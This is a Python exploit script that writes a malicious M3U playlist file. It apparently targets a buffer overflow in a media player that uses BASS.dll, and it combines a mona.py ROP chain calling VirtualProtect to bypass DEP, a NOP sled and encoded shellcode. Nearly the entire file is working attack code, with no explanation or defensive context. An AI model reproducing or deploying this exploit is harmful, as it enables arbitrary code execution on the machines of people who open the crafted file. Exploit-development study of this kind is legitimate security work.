from struct import pack

badchars = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10" #\x00\x09\x0a
        b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e\x1f\x20" #\x1a
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" #
        b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )
def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
    #[---INFO:gadgets_to_set_ebp:---]
    0x1001d892,  # POP EBP # RETN [BASS.dll] 
    0x1001d892,  # skip 4 bytes [BASS.dll]
    #[---INFO:gadgets_to_set_ebx:---]
    0x10015fe7,  # POP EAX # RETN [BASS.dll] 
    0xfffffdff,  # Value to negate, will become 0x00000201
    0x10014db4,  # NEG EAX # RETN [BASS.dll] 
    0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
    #[---INFO:gadgets_to_set_edx:---]
    0x10015fe7,  # POP EAX # RETN [BASS.dll] 
    0xffffffc0,  # Value to negate, will become 0x00000040
    0x10014db4,  # NEG EAX # RETN [BASS.dll] 
    0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] 
    #[---INFO:gadgets_to_set_ecx:---]
    0x100163c7,  # POP ECX # RETN [BASS.dll] 
    0x10035fe2,  # &Writable location [BASS.dll]
    #[---INFO:gadgets_to_set_edi:---]
    0x100190b0,  # POP EDI # RETN [BASS.dll] 
    0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
    #[---INFO:gadgets_to_set_esi:---]
    0x100147b7,  # POP ESI # RETN [BASS.dll] 
    0x100177e4,  # JMP [EAX] [BASS.dll]
    0x10015f82,  # POP EAX # RETN [BASS.dll] 
    0x10040284,  # ptr to &VirtualProtect() [IAT BASS.dll]
    #[---INFO:pushad:---]
    0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    #[---INFO:extras:---]
    0x100222c5,  # ptr to 'jmp esp' [BASS.dll]
    ]
    return b''.join(pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

junk = b"HTTP://" + b"A"*1005
jmp = pack("<L", 0x100222c5)
nops = b'\x90' * 40
shellcode =  b""
shellcode += b"\xdb\xdf\xd9\x74\x24\xf4\xb8\x4e\x2d\x83\x0f"
shellcode += b"\x5f\x2b\xc9\xb1\x31\x31\x47\x18\x03\x47\x18"
shellcode += b"\x83\xef\xb2\xcf\x76\xf3\xa2\x92\x79\x0c\x32"
shellcode += b"\xf3\xf0\xe9\x03\x33\x66\x79\x33\x83\xec\x2f"
shellcode += b"\xbf\x68\xa0\xdb\x34\x1c\x6d\xeb\xfd\xab\x4b"
shellcode += b"\xc2\xfe\x80\xa8\x45\x7c\xdb\xfc\xa5\xbd\x14"
shellcode += b"\xf1\xa4\xfa\x49\xf8\xf5\x53\x05\xaf\xe9\xd0"
shellcode += b"\x53\x6c\x81\xaa\x72\xf4\x76\x7a\x74\xd5\x28"
shellcode += b"\xf1\x2f\xf5\xcb\xd6\x5b\xbc\xd3\x3b\x61\x76"
shellcode += b"\x6f\x8f\x1d\x89\xb9\xde\xde\x26\x84\xef\x2c"
shellcode += b"\x36\xc0\xd7\xce\x4d\x38\x24\x72\x56\xff\x57"
shellcode += b"\xa8\xd3\xe4\xff\x3b\x43\xc1\xfe\xe8\x12\x82"
shellcode += b"\x0c\x44\x50\xcc\x10\x5b\xb5\x66\x2c\xd0\x38"
shellcode += b"\xa9\xa5\xa2\x1e\x6d\xee\x71\x3e\x34\x4a\xd7"
shellcode += b"\x3f\x26\x35\x88\xe5\x2c\xdb\xdd\x97\x6e\xb1"
shellcode += b"\x20\x25\x15\xf7\x23\x35\x16\xa7\x4b\x04\x9d"
shellcode += b"\x28\x0b\x99\x74\x0d\xf3\x7b\x5d\x7b\x9c\x25"
shellcode += b"\x34\xc6\xc1\xd5\xe2\x04\xfc\x55\x07\xf4\xfb"
shellcode += b"\x46\x62\xf1\x40\xc1\x9e\x8b\xd9\xa4\xa0\x38"
shellcode += b"\xd9\xec\xc2\xdf\x49\x6c\x2b\x7a\xea\x17\x33"
# shellcode = b'\xCC' * 200

payload = junk + rop_chain + nops + shellcode
writeFile = open ("exploit.m3u", "wb")
writeFile.write( payload )
writeFile.close()